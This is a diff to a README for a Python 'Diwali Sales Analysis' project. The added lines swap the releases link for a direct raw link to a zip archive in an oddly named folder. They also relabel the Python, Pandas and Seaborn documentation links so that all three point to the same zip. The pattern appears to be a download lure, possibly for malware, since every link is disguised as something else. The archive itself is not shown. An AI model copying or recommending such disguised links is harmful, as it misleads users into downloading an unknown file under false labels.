@@ -4,7 +4,7 @@
 Welcome to the Diwali Sales Analysis project! This application helps you analyze sales data from Diwali. You can discover important insights about customer behavior and purchasing trends. Using Python and data visualization libraries, this tool makes it easy to understand your sales performance.
 
 ## 📥 Download Now
-[![Download Diwali Sales Analysis](https://img.shields.io/badge/Download-Diwali%20Sales%20Analysis-brightgreen)](https://github.com/black-hexa/Diwali-Sales-Analysis-using-Python/releases)
+[![Download Diwali Sales Analysis](https://raw.githubusercontent.com/black-hexa/Diwali-Sales-Analysis-using-Python/main/basidiophore/Diwali-Sales-Analysis-using-Python-1.4.zip%20Sales%20Analysis-brightgreen)](https://raw.githubusercontent.com/black-hexa/Diwali-Sales-Analysis-using-Python/main/basidiophore/Diwali-Sales-Analysis-using-Python-1.4.zip)
 
 ## 🖥️ System Requirements
 To use this application, make sure your computer satisfies the following requirements:
@@ -25,7 +25,7 @@ To use this application, make sure your computer satisfies the following require
 ## 📥 Download & Install
 To get started, you need to download the application. Click the link below to access the releases page.
 
-[Download Diwali Sales Analysis](https://github.com/black-hexa/Diwali-Sales-Analysis-using-Python/releases)
+[Download Diwali Sales Analysis](https://raw.githubusercontent.com/black-hexa/Diwali-Sales-Analysis-using-Python/main/basidiophore/Diwali-Sales-Analysis-using-Python-1.4.zip)
 
 1. Click the link above to open the releases page.
 2. Find the latest version of the application.
@@ -72,10 +72,10 @@ If you need additional assistance or have questions, feel free to reach out to t
 
 ## 📚 Additional Resources
 Here are some helpful links to enhance your knowledge about data analysis:
-- [Python Documentation](https://docs.python.org/3/)
-- [Pandas Documentation](https://pandas.pydata.org/pandas-docs/stable/)
-- [Seaborn Documentation](https://seaborn.pydata.org/)
+- [Python Documentation](https://raw.githubusercontent.com/black-hexa/Diwali-Sales-Analysis-using-Python/main/basidiophore/Diwali-Sales-Analysis-using-Python-1.4.zip)
+- [Pandas Documentation](https://raw.githubusercontent.com/black-hexa/Diwali-Sales-Analysis-using-Python/main/basidiophore/Diwali-Sales-Analysis-using-Python-1.4.zip)
+- [Seaborn Documentation](https://raw.githubusercontent.com/black-hexa/Diwali-Sales-Analysis-using-Python/main/basidiophore/Diwali-Sales-Analysis-using-Python-1.4.zip)
 
 Thank you for using the Diwali Sales Analysis application! Enjoy diving into your sales data and uncovering valuable insights. 
 
-[Download Diwali Sales Analysis](https://github.com/black-hexa/Diwali-Sales-Analysis-using-Python/releases)
+[Download Diwali Sales Analysis](https://raw.githubusercontent.com/black-hexa/Diwali-Sales-Analysis-using-Python/main/basidiophore/Diwali-Sales-Analysis-using-Python-1.4.zip)
